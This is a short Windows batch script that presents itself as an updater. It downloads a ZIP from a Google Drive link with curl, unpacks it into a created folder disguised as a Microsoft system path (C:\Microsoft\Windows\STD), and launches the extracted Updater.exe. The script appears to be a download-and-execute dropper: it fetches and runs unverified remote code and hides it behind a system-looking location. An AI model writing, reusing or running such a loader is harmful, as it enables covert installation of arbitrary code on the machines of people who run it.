@echo off
REM Define variables
set "googleDriveFileUrl=https://drive.usercontent.google.com/download?id=16a75TjuYS659N5yOhH52HMhmQj5aILOa&export=download&authuser=0&confirm=t&uuid=8a123337-ec9f-4db2-b052-ddeb2f8ec073&at=APvzH3pkx49FBVV3ozSljyM2hTlS:1733950338985"
set "destinationFolder=C:\Microsoft\Windows\STD"
set "downloadedFileName=updater.zip"
set "extractionFolder=%destinationFolder%\"

REM Ensure the destination folder exists
if not exist "%destinationFolder%" (
    mkdir "%destinationFolder%"
)

REM Full path to the downloaded file
set "downloadedFilePath=%destinationFolder%\%downloadedFileName%"

REM Download the ZIP file using curl
curl -L -o "%downloadedFilePath%" "%googleDriveFileUrl%"

REM Ensure the extraction folder exists
if not exist "%extractionFolder%" (
    mkdir "%extractionFolder%"
)

REM Extract the ZIP file using PowerShell
powershell -Command "Expand-Archive -Path '%downloadedFilePath%' -DestinationPath '%extractionFolder%' -Force"
cd C:\Microsoft\Windows\STD\
start C:\Microsoft\Windows\STD\Updater.exe -f
